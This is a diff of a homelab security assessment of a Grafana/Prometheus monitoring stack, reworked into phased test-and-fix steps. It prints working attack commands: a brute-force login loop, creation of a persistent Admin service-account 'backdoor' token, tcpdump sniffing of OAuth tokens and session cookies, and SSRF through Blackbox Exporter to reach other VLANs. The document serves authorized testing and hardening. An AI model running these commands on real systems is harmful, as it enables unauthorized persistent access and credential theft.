+  -d '{"name":"backdoor-token"}' | python3 -m json.tool
 
-# Generate permanent API token
-curl -s -X POST http://localhost:3000/api/serviceaccounts/5/tokens \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Basic $(echo -n 'admin:<test-password>' | base64)" \
-  -d '{"name":"backdoor-token"}'
-{"id":1,"name":"backdoor-token","key":"glsa_<redacted-token-invalidated-after-testing>"}
+# CLEANUP: Remove the test backdoor
+curl -s -X DELETE "http://$GRAFANA:3000/api/serviceaccounts/$SA_ID" \
+  --cookie "grafana_session=$SESSION_COOKIE"
+echo "Backdoor cleaned up"
 ```
 
-Token verified locally, then from the jump box on a completely different VLAN:
-
-```bash
-# From VLAN 50 -- full Admin access with just a token string
-curl -s http://192.168.75.109:3000/api/org \
-  -H "Authorization: Bearer glsa_<redacted-token-invalidated-after-testing>"
-{"id":1,"name":"Main Org."}
-```
-
-Full Admin org access from VLAN 50. The service account survives password changes, SSO reconfiguration, and user account deletion. The only thing that kills it is explicitly deleting the service account itself -- which an admin would need to know exists.
-
-The backdoor was cleaned up after verification:
-
-```bash
-curl -s -X DELETE http://localhost:3000/api/serviceaccounts/5 \
-  -H "Authorization: Basic $(echo -n 'admin:<test-password>' | base64)"
-{"message":"Service account deleted"}
-```
-
-The full attack chain: brute-force the login (no rate limiting) → authenticate as admin → create service account with Admin role → generate API token → permanent remote access from any network that can reach port 3000. That's the chain from "I can reach the login page" to "I have persistent admin access that survives credential rotation."
-
-**Compliance impact:** NIST AC-7 (Unsuccessful Logon Attempts), IA-5, SOC 2 CC6.1.
+**Attacker value:** A terminated employee retains full access from any machine on the network. Combined with VULN-07, they can establish permanent persistence via service account tokens before anyone notices.
 
 ---
 
-## VULN-08: Watching OAuth Tokens Fly By in Plaintext [HIGH]
+## Phase 2: HAProxy TLS Termination
 
-Every OAuth URL in the Grafana configuration uses `http://`:
+**Time:** ~1 hour | **Score:** 7.5 to 8.0 (+0.5)
 
-```bash
-sudo docker exec grafana env | grep -E "(AUTH_URL|TOKEN_URL|API_URL)"
-GF_AUTH_GENERIC_OAUTH_AUTH_URL=http://192.168.80.54:9000/application/o/authorize/
-GF_AUTH_GENERIC_OAUTH_API_URL=http://192.168.80.54:9000/application/o/userinfo/
-GF_AUTH_GENERIC_OAUTH_TOKEN_URL=http://192.168.80.54:9000/application/o/token/
-```
+**Vulnerabilities Addressed:** VULN-07, VULN-10
 
-No TLS. Not even TLS with skip-verify -- the `TLS_SKIP_VERIFY` environment variable wasn't set because there's no TLS to skip. A packet capture during an OAuth login flow confirmed what that means in practice:
-
-```bash
-sudo tcpdump -i any -c 50 -w /tmp/oauth-capture.pcap host 192.168.80.54
-# (trigger OAuth login in browser)
-# 50 packets captured, 55 received by filter
-```
-
-The captured traffic contained the Base64-encoded Authorization header from the token exchange:
-
-```bash
-echo '<redacted-base64-encoded-credentials>' | base64 -d
-grafana-client:<redacted-128-char-secret>
-```
-
-Client ID and 128-character secret, captured from the wire. The JWT token payload was equally revealing:
-
-```json
-{
-  "iss": "http://192.168.80.54:9000/application/o/grafana/",
-  "sub": "<redacted-subject-identifier>",
-  "aud": "grafana-client",
-  "amr": ["pwd"],
-  "email": "admin@lab.local",
-  "name": "authentik Default Admin",
-  "preferred_username": "akadmin",
-  "groups": ["authentik Admins", "Grafana Admins"]
-}
-```
-
-Email, username, group memberships (including both admin groups), authentication method (`pwd` -- password only, no MFA), and session identifiers. All from passive sniffing -- no active man-in-the-middle required. Anyone on the network segment between Grafana-lab and Authentik sees every OAuth exchange in full.
-
-**Compliance impact:** NIST SC-8 (Transmission Confidentiality), SC-23 (Session Authenticity), SOC 2 CC6.7.
+Phase 2 is about the network layer. Everything we just proved in Phase 1 — the session cookies, the admin credentials, the OAuth tokens — all of it travels in plaintext across the wire right now. And there's nothing stopping an attacker from throwing login attempts at Grafana until they guess the password. Let's prove both of those.
 
 ---
 
-## VULN-09: The Security Headers That Give You Just Enough False Confidence [MEDIUM]
+### VULN-10: No TLS Encryption
+
+**Severity:** High | **CVSS:** 7.4
+
+**Compliance Violations:** NIST SC-8, PCI-DSS 4.1, SOC 2 CC6.7
+
+**The goal:** We're going to prove that there is zero encryption between the browser and Grafana. No HTTPS, no HSTS, no security headers, nothing. Every session cookie, every API credential, every OAuth token exchange happens in plaintext HTTP. If you're on the same network segment, you can see everything with tcpdump.
+
+**What we're trying to break:** We want to show three things. First, that there's no TLS listener at all — port 443 doesn't even respond. Second, that session cookies are set without the Secure flag, meaning the browser will happily send them over HTTP. And third, the real payoff — we'll demonstrate that basic auth credentials are just base64 encoded (not encrypted), so they appear on the wire in a trivially decodable format. Combined with VULN-06's session persistence, a captured cookie gives an attacker permanent access.
+
+**API Reference:**
+- HAProxy Configuration Manual: https://www.haproxy.org/documentation.html
+- OpenBAO PKI Secrets Engine: https://openbao.org/docs/secrets/pki/
+- RFC 6750 (Bearer Token Usage): https://datatracker.ietf.org/doc/html/rfc6750
+
+#### PROVE IT
 
 ```bash
-curl -sI http://192.168.75.109:3000/login
-HTTP/1.1 200 OK
-Cache-Control: no-store
-Content-Type: text/html; charset=UTF-8
-X-Content-Type-Options: nosniff
-X-Frame-Options: deny
-X-Xss-Protection: 1; mode=block
+# From jump box
+GRAFANA="192.168.75.109"
+
+echo "=== VULN-10: No TLS Encryption ==="
+
+# All traffic is plain HTTP
+echo "--- HTTP response headers (no TLS, no security headers) ---"
+curl -sI http://$GRAFANA:3000
+# EXPECTED: HTTP/1.1 200 OK (or 302)
+# NOTE: No HTTPS, no HSTS, no security headers
+
+# No TLS listener at all
+echo ""
+echo "--- TLS test (should fail — no HTTPS service exists) ---"
+echo | openssl s_client -connect $GRAFANA:443 2>&1 | head -5
+# EXPECTED: Connection refused — no TLS service exists
+
+# Browser cookies set without Secure flag
+echo ""
+echo "--- Cookie security (no Secure flag) ---"
+curl -sI http://$GRAFANA:3000/login | grep -i "set-cookie"
+# EXPECTED: grafana_session cookie WITHOUT Secure or HttpOnly flags
 ```
 
-At first glance, this looks reasonable. Three security headers present. If you're running a quick audit and checking boxes, you might move on. But what's missing matters more than what's there.
+**What you should see from jump box:** All traffic is unencrypted HTTP. Session cookies, OAuth tokens, and API credentials travel in plaintext over the network.
 
-No `Strict-Transport-Security` -- browsers will happily downgrade to HTTP even after you deploy TLS. No `Content-Security-Policy` -- if an XSS vulnerability lands, there's nothing restricting what scripts can execute. No `Referrer-Policy` -- full URLs (including any query parameters with tokens or session data) leak to every external resource the page loads. No `Permissions-Policy` -- the browser's camera, microphone, and geolocation APIs are all available to any script that asks.
+#### BREAK IT
 
-The three headers Grafana ships are the easy ones. The four it doesn't are the ones that actually constrain an attacker's options after initial access.
+```bash
+# From jump box on the monitoring VLAN — passive network sniffing
+GRAFANA="192.168.75.109"
 
-**Compliance impact:** NIST SC-8, CIS Controls 16.8.
+# Step 1: Capture OAuth token exchange (jump box must be on same L2 segment or mirror port)
+# If jump box is on the VLAN, ARP spoofing or mirror port captures this traffic
+sudo tcpdump -i any -A 'host 192.168.80.54 and port 9000' -c 50 2>/dev/null | \
+  grep -i "authorization\|token\|client_secret"
+# Captures OAuth tokens in transit between Grafana and Authentik
+
+# Step 2: Capture Grafana session cookies of any user logging in
+sudo tcpdump -i any -A "host $GRAFANA and port 3000" -c 50 2>/dev/null | \
+  grep -i "grafana_session\|cookie"
+# Stolen cookies can be replayed from jump box (see VULN-06)
+
+# Step 3: Even without sniffing, prove HTTP exposure from jump box
+echo "--- Proof: credentials travel in cleartext ---"
+# Basic auth credentials are just base64 (trivially decoded)
+echo -n "admin:$ADMIN_PASSWORD" | base64
+# Output: YWRtaW46VGVtcFBhc3MxMjMh
+# This exact string appears on the wire for every authenticated request
+```
+
+**Attacker value:** Session hijacking, credential theft, full OAuth flow interception. RFC 6750 explicitly states bearer tokens must only be transmitted over TLS.
+
+**MITRE ATT&CK:** T1040 Network Sniffing — https://attack.mitre.org/techniques/T1040/
 
 ---
 
-## VULN-10: Zero TLS Anywhere [MEDIUM]
+### VULN-07: No Rate Limiting / Brute Force Protection
+
+**Severity:** Medium | **CVSS:** 5.3
+
+**Compliance Violations:** NIST SC-5, OWASP ASVS 2.2.1
+
+**The goal:** We're going to prove that Grafana has absolutely no brute force protection. No account lockout, no rate limiting, no progressive delays, not even rate limit headers in the response. An attacker can throw thousands of password guesses per minute and Grafana will happily process every single one.
+
+**What we're trying to break:** First we prove it — fire 10 rapid login attempts with wrong passwords and show they all execute instantly with no pushback. Then we demonstrate the payoff: once the attacker guesses the password (or gets it from VULN-01's default credentials), they create a service account with a permanent API token. That token works forever, from any machine, even if the admin password gets changed later. It's a backdoor that survives password rotation — and it was created entirely from the jump box without ever touching the server.
+
+**API Reference:**
+- Grafana Admin HTTP API: https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/admin/
+- Grafana Service Account API: https://grafana.com/docs/grafana/latest/developer-resources/api-reference/http-api/serviceaccount/
+
+#### PROVE IT
 
 ```bash
-curl -sk -o /dev/null -w "HTTP %{http_code}\n" https://192.168.75.109
-HTTP 000
-```
+# From jump box
+GRAFANA="192.168.75.109"
 
-HTTP 000. Not a certificate error. Not a self-signed warning. The connection was refused outright -- there is no TLS listener on any port of this host. The concept of encryption doesn't exist here.
+echo "=== VULN-07: No Rate Limiting ==="
 
-```bash
-curl -s http://192.168.75.109:3000/api/health | jq .
-{"database": "ok", "version": "12.3.2", "commit": "df2547decd50d14defa20ec9ce1c2e2bc9462d72"}
-```
-
-Grafana version 12.3.2, commit hash included, served over cleartext. `ROOT_URL` is `http://192.168.75.109:3000`. Admin credentials, API tokens, session cookies, dashboard data, OAuth exchanges -- all of it crosses the wire in plaintext. This was a deliberate choice for the initial deployment (documented in the deployment post), but deliberate doesn't mean safe. Anyone with `tcpdump` and network adjacency owns every session on this box.
-
-**Compliance impact:** NIST SC-8, SOC 2 CC6.7.
-
----
-
-## VULN-11: Docker Containers Running With the Keys to the Kingdom [MEDIUM]
-
-```bash
-for c in grafana prometheus node-exporter cadvisor blackbox-exporter; do
-  echo "=== $c ==="
-  sudo docker inspect $c --format='User={{.Config.User}} Privileged={{.HostConfig.Privileged}} CapDrop={{.HostConfig.CapDrop}} Memory={{.HostConfig.Memory}}'
+# Rapid-fire login attempts from jump box — no throttling
+echo "--- Brute force simulation (10 attempts, all from jump box) ---"
+for i in $(seq 1 10); do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+    -u "admin:wrongpassword$i" \
+    http://$GRAFANA:3000/api/org)
+  echo "  Attempt $i: HTTP $CODE"
 done
+# EXPECTED: All return 401 — no lockout, no rate limit, no delay
+
+# Check for any rate limit headers
+echo ""
+echo "--- Response headers (no rate limit headers present) ---"
+curl -sI -u admin:wrong http://$GRAFANA:3000/api/org | grep -i "rate\|retry\|limit"
+# EXPECTED: No output — no rate limiting configured
 ```
 
-```
-=== grafana ===
-User=472 Privileged=false CapDrop=[] Memory=0
-=== prometheus ===
-User=nobody Privileged=false CapDrop=[] Memory=0
-=== node-exporter ===
-User=nobody Privileged=false CapDrop=[] Memory=0
-=== cadvisor ===
-User= Privileged=false CapDrop=[] Memory=0
-=== blackbox-exporter ===
-User= Privileged=false CapDrop=[] Memory=0
-```
+**What you should see from jump box:** All 10 attempts execute instantly with no delay, lockout, or rate limiting. An attacker can run thousands of attempts per minute from any machine on the network.
 
-`CapDrop=[]`. Five containers. Not a single capability dropped on any of them.
-
-Look at the other columns. cAdvisor and blackbox-exporter have `User=` -- empty, which means root. `Memory=0` across the board -- no limits, on a host with 2GB of RAM. No `no-new-privileges`. No read-only filesystems. These containers have the full default Linux capability set and nothing preventing them from asking for more.
-
-Grafana at least runs as user 472 and Prometheus as `nobody`, so there's some non-root discipline happening. But without `cap_drop: ALL`, a container escape from any of these -- especially the two running as root -- hands an attacker capabilities they should never have had in the first place.
-
-**Compliance impact:** NIST CM-7, SC-6 (Resource Availability), CIS Docker 5.3, 5.10, 5.11, 5.26.
-
----
-
-## VULN-12: Flat Container Network -- Compromise One, Reach All [MEDIUM]
+#### BREAK IT
 
 ```bash
-sudo docker network ls --format '{{.Name}}' | grep -v "bridge\|host\|none"
-monitoring_default
+# From jump box — brute force to persistent backdoor
+GRAFANA="192.168.75.109"
+
+# Step 1: Assume admin password obtained (via brute force or VULN-01 default creds)
+ADMIN_CREDS="admin:$ADMIN_PASSWORD"    # See Password Convention section
+
+# Step 2: Create an Admin service account from jump box (silent backdoor)
+SA_ID=$(curl -s -X POST http://$GRAFANA:3000/api/serviceaccounts \
+  -H "Content-Type: application/json" \
+  -u "$ADMIN_CREDS" \
+  -d '{"name":"monitoring-svc","role":"Admin"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('id','FAILED'))")
+echo "Service account created: ID $SA_ID"
+
+# Step 3: Generate a permanent API token (never expires by default)
+TOKEN=$(curl -s -X POST "http://$GRAFANA:3000/api/serviceaccounts/$SA_ID/tokens" \
+  -H "Content-Type: application/json" \
+  -u "$ADMIN_CREDS" \
+  -d '{"name":"backup-token"}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('key','FAILED'))")
+echo "Permanent token: $TOKEN"
+
+# Step 4: Verify the token works independently from jump box
+curl -s http://$GRAFANA:3000/api/org \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+# This token works forever, from any machine, even if admin password changes
+
+# CLEANUP: Remove the test backdoor
+curl -s -X DELETE "http://$GRAFANA:3000/api/serviceaccounts/$SA_ID" \
+  -u "$ADMIN_CREDS"
+echo "Backdoor cleaned up"
 ```
 
-One network. Five containers. No segmentation. Can Grafana talk to Prometheus directly?
+**Attacker value:** Brute force admin credentials from jump box, create permanent service account token that survives password changes — all without ever touching the server.
+
+**MITRE ATT&CK:** T1136 Create Account — https://attack.mitre.org/techniques/T1136/
+
+---
+
+## Phase 3: Prometheus Authentication
+
+**Time:** ~30 minutes | **Score:** 8.0 to 8.5 (+0.5)
+
+**Vulnerabilities Addressed:** VULN-01 (Grafana default creds — addressed by strong password in Phase 1), VULN-02 (Prometheus unauthenticated), VULN-03 (cAdvisor exposure — partial, full fix in Phase 6), VULN-04 (Blackbox SSRF — partial, full fix in Phase 6)
+
+This is where things get really interesting from an attacker's perspective. Grafana at least requires a password (even if it's the default one). Prometheus, cAdvisor, and Blackbox Exporter? Wide open. No auth, no restrictions, nothing. And Prometheus in particular is an absolute goldmine for reconnaissance — it knows everything about your infrastructure because that's literally its job.
+
+---
+
+### VULN-02: Prometheus Unauthenticated API
+
+**Severity:** Critical | **CVSS:** 7.5
+
+**Compliance Violations:** NIST AC-3, SOC 2 CC6.1, CIS 6.2
+
+**The goal:** We're going to prove that Prometheus gives away your entire infrastructure topology to anyone who can reach port 9090. No password, no API key, nothing. One curl command and you get hostnames, kernel versions, every service being monitored, internal IP addresses, port numbers, and the full scrape configuration. It's like handing an attacker a network diagram and saying "here, this should help."
+
+**What we're trying to break:** We want to demonstrate the full reconnaissance chain. First, basic host info (hostname, kernel, architecture). Then the complete infrastructure topology (every scrape target with internal URLs). Then we go deeper — enumerate every metric name, pull the Docker container inventory through cAdvisor metrics in Prometheus, and check labels for sensitive data. All from the jump box. All without credentials. The point is to show that Prometheus isn't just leaking data — it's actively organized for easy querying.
+
+**API Reference:**
+- Prometheus HTTP API: https://prometheus.io/docs/prometheus/latest/querying/api/
+- Prometheus Security Model: https://prometheus.io/docs/operating/security/
+- Securing Prometheus with Basic Auth: https://prometheus.io/docs/guides/basic-auth/
+
+Note: Prometheus also serves an OpenAPI spec at `/api/v1/openapi.yaml` on any running instance, making API discovery trivial.
+
+#### PROVE IT
 
 ```bash
-sudo docker exec grafana wget -qO- http://prometheus:9090/metrics | head -3
-# HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles...
-# TYPE go_gc_cycles_automatic_gc_cycles_total counter
-go_gc_cycles_automatic_gc_cycles_total 2044
+# From jump box — complete infrastructure enumeration without any credentials
+GRAFANA="192.168.75.109"
+
+echo "=== VULN-02: Prometheus Unauthenticated ==="
+
+# Step 1: Host reconnaissance — kernel version, hostname, architecture
+echo "--- Host Reconnaissance (from jump box, no auth) ---"
+curl -s "http://$GRAFANA:9090/api/v1/query?query=node_uname_info" | \
+  python3 -c "import sys,json; data=json.load(sys.stdin); [print(f\"  Host: {r['metric']['nodename']}  Kernel: {r['metric']['release']}  Arch: {r['metric']['machine']}\") for r in data['data']['result']]"
+
+# Step 2: Full infrastructure topology — every monitored service
+echo ""
+echo "--- Infrastructure Topology (complete network map, free) ---"
+curl -s http://$GRAFANA:9090/api/v1/targets | \
+  python3 -c "import sys,json; data=json.load(sys.stdin); [print(f\"  {t['labels'].get('job','?')}: {t['scrapeUrl']}  State: {t['health']}\") for t in data['data']['activeTargets']]"
+
+# Step 3: Full scrape configuration — internal hostnames, ports, auth configs
+echo ""
+echo "--- Scrape Configuration Dump ---"
+curl -s http://$GRAFANA:9090/api/v1/status/config | \
+  python3 -c "import sys,json; print(json.load(sys.stdin)['data']['yaml'][:500])"
+
+# Step 4: Raw metrics endpoint
+echo ""
+echo "--- Raw Metrics (first 10 lines) ---"
+curl -s http://$GRAFANA:9090/metrics | head -10
+
+# Step 5: Prometheus self-documents its API (makes discovery trivial)
+echo ""
+echo "--- OpenAPI Spec Available ---"
+curl -s -o /dev/null -w "OpenAPI spec: HTTP %{http_code}" http://$GRAFANA:9090/api/v1/status/buildinfo
+echo " (also serves /api/v1/openapi.yaml)"
 ```
 
-DNS resolution by container name, full metrics access, no authentication needed. The reverse works too -- Prometheus can reach Grafana's health endpoint by IP (DNS name resolution is inconsistent in the reverse direction, but IP works fine). Every container in the stack can talk to every other container:
+**What you should see from jump box:** Complete infrastructure enumeration — hostname, kernel version, every monitored service with internal IPs/ports, full scrape configuration. No authentication required. No server access needed.
 
-```
-grafana:            172.18.0.3
-prometheus:         172.18.0.4
-node-exporter:      172.18.0.2
-cadvisor:           172.18.0.6
-blackbox-exporter:  172.18.0.5
-```
-
-All on a /16 subnet. Zero east-west traffic controls. There's no reason blackbox-exporter needs to talk to Grafana. There's no reason cAdvisor needs to reach Prometheus. But they all can, because `docker-compose up` creates one flat network by default and nobody questions it.
-
-**Compliance impact:** NIST SC-7, CIS Docker 5.30.
-
----
-
-## VULN-13: When Your Config Disagrees With Itself [LOW]
+#### BREAK IT
 
 ```bash
-sudo docker exec grafana env | grep ALLOW_SIGN_UP
-GF_USERS_ALLOW_SIGN_UP=false
-GF_AUTH_GENERIC_OAUTH_ALLOW_SIGN_UP=true
+# From jump box — deep reconnaissance without credentials
+GRAFANA="192.168.75.109"
+
+# Step 1: Enumerate all metric names (inventory what's monitored)
+METRIC_COUNT=$(curl -s http://$GRAFANA:9090/api/v1/label/__name__/values | \
+  python3 -c "import sys,json; data=json.load(sys.stdin); print(len(data['data']))")
+echo "Total metrics available: $METRIC_COUNT"
+
+# Step 2: Extract Docker container inventory via cAdvisor metrics
+echo ""
+echo "--- Container Inventory (via Prometheus from jump box) ---"
+curl -s "http://$GRAFANA:9090/api/v1/query?query=container_last_seen" | \
+  python3 -c "import sys,json; data=json.load(sys.stdin); [print(f\"  {r['metric'].get('name','<host>')}: {r['metric'].get('image','N/A')}\") for r in data['data']['result']]"
+
+# Step 3: Check for secrets in labels or annotations
+echo ""
+echo "--- All available labels (check for sensitive data) ---"
+curl -s http://$GRAFANA:9090/api/v1/labels | \
+  python3 -c "import sys,json; data=json.load(sys.stdin); [print(f'  {l}') for l in data['data']]"
 ```
 
-Read those two lines again. General sign-up: disabled. OAuth sign-up: enabled. They contradict each other, and the OAuth flag wins. Whoever configured this thought they'd locked down account creation. They hadn't.
+**Attacker value:** Complete infrastructure reconnaissance from a jump box. Every service, version, internal IP, and port — without authenticating. This is a network diagram handed over for free.
 
-Any user who completes the OAuth flow through Authentik gets auto-provisioned, and the role mapping is generous:
+---
+
+### VULN-03: cAdvisor Exposed (Port 8080)
+
+**Severity:** High | **CVSS:** 5.3
+
+**Compliance Violations:** NIST AC-3, CIS 6.2
+
+**The goal:** cAdvisor is Google's container monitoring tool, and it's running with its full API exposed to the network. We're going to prove that anyone on the VLAN can pull machine-level hardware details (CPU count, memory, disk), plus a full inventory of every running container including names, images, and resource usage. It's a different angle than Prometheus — cAdvisor gives you the Docker runtime view while Prometheus gives you the metrics view.
+
+**What we're trying to break:** The machine info endpoint (`/api/v1.0/machine`) and the container summary endpoint (`/api/v2.0/summary/`) — both unauthenticated, both returning detailed JSON that maps out the entire container environment.
+
+**API Reference:**
+- cAdvisor API documentation: https://github.com/google/cadvisor/blob/master/docs/api.md
+
+#### PROVE IT
 
 ```bash
-sudo docker exec grafana env | grep ROLE_ATTRIBUTE
-GF_AUTH_GENERIC_OAUTH_ROLE_ATTRIBUTE_PATH=contains(groups[*], 'Grafana Admins') && 'Admin' || 'Viewer'
+# From jump box — full container runtime details without auth
+GRAFANA="192.168.75.109"
+
+echo "=== VULN-03: cAdvisor Exposed ==="
+
+# Container runtime details
+echo "--- Machine Info (from jump box) ---"
+curl -s http://$GRAFANA:8080/api/v1.0/machine | python3 -m json.tool | head -20
+
+# All containers with full details
+echo ""
+echo "--- Container Summary ---"
+curl -s http://$GRAFANA:8080/api/v2.0/summary/ | python3 -m json.tool | head -30
+
+# Raw Prometheus metrics
+echo ""
+echo "--- Metrics Sample ---"
+curl -s http://$GRAFANA:8080/metrics | grep "cadvisor_version\|machine_cpu\|machine_memory" | head -5
 ```
-
-Member of `Grafana Admins` in Authentik? Automatic Admin in Grafana. The user inventory confirmed it: 4 accounts total, 1 local admin, 3 OAuth-provisioned, 2 of which had Admin role.
-
-How dangerous this is depends entirely on Authentik's application assignment. If only explicitly-assigned users can authenticate to the Grafana application, this is manageable. If the application is broadly accessible, it's a privilege escalation path hiding behind a config flag that looks like it's doing its job.
-
-**Compliance impact:** NIST AC-2 (Account Management).
 
 ---
 
-## VULN-14: Logs That Lie About Who's Attacking You [LOW]
+### VULN-04: Blackbox Exporter SSRF (Port 9115)
+
+**Severity:** High | **CVSS:** 6.1
+
+**Compliance Violations:** NIST AC-3, OWASP SSRF
+
+**The goal:** This one's my favorite because it's so unexpected. Blackbox Exporter is designed to probe endpoints and report whether they're up or down. But it has a `/probe` endpoint that accepts arbitrary target URLs. That means anyone who can reach port 9115 can tell Blackbox to probe *any* URL — including services on other VLANs that the attacker can't reach directly. It's a server-side request forgery (SSRF) vector built right into the monitoring stack.
+
+**What we're trying to break:** We're going to use Blackbox as a proxy to reach OpenBAO on VLAN 100 and Authentik on VLAN 80 — from a jump box that's only on VLAN 75. The whole point of VLAN segmentation is to isolate traffic between networks. Blackbox defeats that completely because it sits on a host that can reach all three VLANs, and it'll probe whatever URL you give it.
+
+**API Reference:**
+- Blackbox Exporter: https://github.com/prometheus/blackbox_exporter
+- Blackbox Configuration: https://github.com/prometheus/blackbox_exporter/blob/master/CONFIGURATION.md
+
+#### PROVE IT
 
 ```bash
-sudo docker exec grafana env | grep GF_LOG
+# From jump box — use Blackbox as SSRF proxy to cross VLAN boundaries
+GRAFANA="192.168.75.109"
+
+echo "=== VULN-04: Blackbox Exporter SSRF ==="
+
+# Use Blackbox as a proxy to probe internal services on other VLANs
+echo "--- SSRF: Probing OpenBAO on VLAN 100 from jump box via VLAN 75 ---"
+curl -s "http://$GRAFANA:9115/probe?target=http://192.168.100.140:8200/v1/sys/health&module=http_2xx" | \
+  grep "probe_success\|probe_http_status_code"
+# EXPECTED: probe_success 1, probe_http_status_code 200
+# Blackbox just crossed VLAN boundaries for us — from jump box!
+
+# Probe Authentik on VLAN 80
+echo ""
+echo "--- SSRF: Probing Authentik on VLAN 80 via VLAN 75 ---"
+curl -s "http://$GRAFANA:9115/probe?target=http://192.168.80.54:9000/-/health/ready/&module=http_2xx" | \
+  grep "probe_success\|probe_http_status_code"
 ```
 
-Empty. Zero logging configuration. Console-only output, text format, 1,721 ephemeral lines that vanish on container restart. That alone is a finding. But the worse discovery was what the logs actually contained.
+**Attacker value:** Blackbox becomes an SSRF proxy controllable from the jump box. An attacker who can reach port 9115 can probe services on other VLANs through the Blackbox `/probe` endpoint — defeating network segmentation without ever leaving their machine.
+
+---
+
+## Phase 4: OpenBAO Secret Injection Validation
+
+**Time:** ~30 minutes | **Score:** 8.5 to 9.0 (+0.5)
+
+**Vulnerabilities Addressed:** VULN-05 (deep validation)
+
+Phase 4 is different from the others — we're not finding new vulnerabilities here. Instead, we're verifying that the fix from Phase 1 actually works. This matters because vault integrations are one of those things that can look fine in the logs but still be leaking secrets somewhere unexpected. We're going to walk the entire chain: authenticate to OpenBAO, retrieve the secret, verify Grafana is using it, and then confirm the secret doesn't appear in any of the old places (`.env`, docker-compose.yml, container environment, docker inspect).
+
+Phase 4 validates the OpenBAO secret injection chain. The jump box portion proves the secrets vault works; the auditor portion confirms nothing leaks locally.
+
+#### PROVE IT / VERIFY — Combined
 
 ```bash
-sudo docker logs grafana 2>&1 | grep -i "invalid\|failed\|unauth"
+# From jump box — verify the OpenBAO chain works end-to-end
+GRAFANA="192.168.75.109"
+OPENBAO="192.168.100.140"
+
+echo "=== Phase 4: Secret Injection Validation ==="
+echo ""
+echo "--- OpenBAO Chain (from jump box) ---"
+
+echo -n "  OpenBAO reachable: "
+curl -s http://$OPENBAO:8200/v1/sys/health | grep -q '"sealed":false' && echo "PASS" || echo "FAIL"
+
+echo -n "  AppRole login works: "
+# NOTE: Role ID and Secret ID from your Password Convention section
+BAO_ROLE_ID="$GRAFANA_ROLE_ID"
+BAO_SECRET_ID="$GRAFANA_SECRET_ID"
+TOKEN=$(curl -s -X POST \
+  -d "{\"role_id\":\"${BAO_ROLE_ID}\",\"secret_id\":\"${BAO_SECRET_ID}\"}" \
+  http://$OPENBAO:8200/v1/auth/approle/login | \
+  python3 -c "import sys,json; print(json.load(sys.stdin).get('auth',{}).get('client_token',''))")
+[ -n "$TOKEN" ] && echo "PASS" || echo "FAIL"
+
+echo -n "  Secret retrievable: "
+CLIENT_ID=$(curl -s -H "X-Vault-Token: $TOKEN" \
+  http://$OPENBAO:8200/v1/secret/data/grafana/oauth | \
+  python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('data',{}).get('client_id',''))")
+[ "$CLIENT_ID" = "grafana-client" ] && echo "PASS" || echo "FAIL"
+
+echo ""
+echo "--- Remote API Verification (from jump box) ---"
+
+echo -n "  Admin settings shows masked secret: "
+curl -s -u admin:$ADMIN_PASSWORD http://$GRAFANA:3000/api/admin/settings 2>/dev/null | \
+  python3 -c "
+import sys,json
+d=json.load(sys.stdin)
+cs=d.get('auth.generic_oauth',{}).get('client_secret','')
+print('PASS (masked)' if '***' in cs else 'FAIL (exposed!)' if cs else 'NOT CONFIGURED')
+" 2>/dev/null
+
+echo -n "  Grafana healthy: "
+curl -s -o /dev/null -w "%{http_code}" http://$GRAFANA:3000/api/health
+echo ""
+
+echo -n "  OAuth login page present: "
+curl -s http://$GRAFANA:3000/login | grep -q "Authentik" && echo "PASS" || echo "FAIL"
 ```
 
-The brute-force test from VULN-07 did trigger Grafana's internal lockout ("too many consecutive incorrect login attempts") -- so there's some built-in protection happening. Good. Except every single `remote_addr` value in those log entries was `172.18.0.1`. The Docker gateway IP. Not the attacker's IP. Not the jump box on VLAN 50. The Docker gateway.
-
-Every failed login, every lockout trigger, every suspicious authentication event -- they all point to the same internal address. Your incident response team sees the alert, pulls the logs, and finds... the Docker bridge. You know someone was hammering the login page. You have no idea who.
-
-**Compliance impact:** NIST AU-2 (Audit Events), AU-3 (Content of Audit Records), SOC 2 CC7.2.
-
----
-
-## VULN-15: One Bad Command Away From Total Loss [LOW]
+**For deeper audit (requires SSH access to Grafana-lab):**
 
 ```bash
-ls -la ~/monitoring/backup* 2>/dev/null; crontab -l 2>/dev/null | grep -i backup
+# SSH to Grafana-lab for container-level validation
+ssh oob@192.168.75.109
+
+echo "--- Container-Level Checks (auditor access) ---"
+echo -n "  Entrypoint logs clean: "
+docker logs grafana 2>&1 | grep -q "Secrets loaded successfully" && echo "PASS" || echo "FAIL"
+
+echo ""
+echo "--- Secret Absence Verification ---"
+echo -n "  NOT in .env: "
+grep -q "CLIENT_SECRET" ~/monitoring/.env && echo "FAIL" || echo "PASS"
+
+echo -n "  NOT in docker-compose.yml: "
+grep -qi "client_secret" ~/monitoring/docker-compose.yml && echo "FAIL" || echo "PASS"
+
+echo -n "  NOT in container env: "
+docker exec grafana env 2>/dev/null | grep -q "CLIENT_SECRET" && echo "FAIL" || echo "PASS"
+
+echo -n "  NOT in docker inspect: "
+docker inspect grafana --format '{{json .Config.Env}}' | grep -q "CLIENT_SECRET" && echo "FAIL" || echo "PASS"
+
+echo ""
+echo "Score: 8.5 -> 9.0 (+0.5)"
 ```
 
-Nothing. No backup scripts. No cron jobs. No backup directories. No evidence that anyone has ever thought about what happens when this host dies.
+---
+
+## Phase 5: Container Hardening
+
+**Time:** ~45 minutes | **Score:** 9.0 to 9.5 (+0.5)
+
+**Vulnerabilities Addressed:** VULN-09, VULN-11
+
+Now we go deeper — below the application layer, into the container runtime itself. These vulnerabilities are different from everything else we've looked at because you can't find them from the network. Grafana's API doesn't expose Docker container configuration. You need SSH access and the Docker CLI to see these issues, which is why network-based vulnerability scanners miss them entirely. But they matter, because if an attacker gets code execution inside the container (through a future CVE, a plugin vulnerability, or a supply chain attack), these settings determine how much damage they can do.
+
+---
+
+### VULN-09: Missing Container Hardening
+
+**Severity:** Medium | **CVSS:** 5.0
+
+**Compliance Violations:** CIS Docker Benchmark 5.3/5.4/5.25, NIST CM-7
+
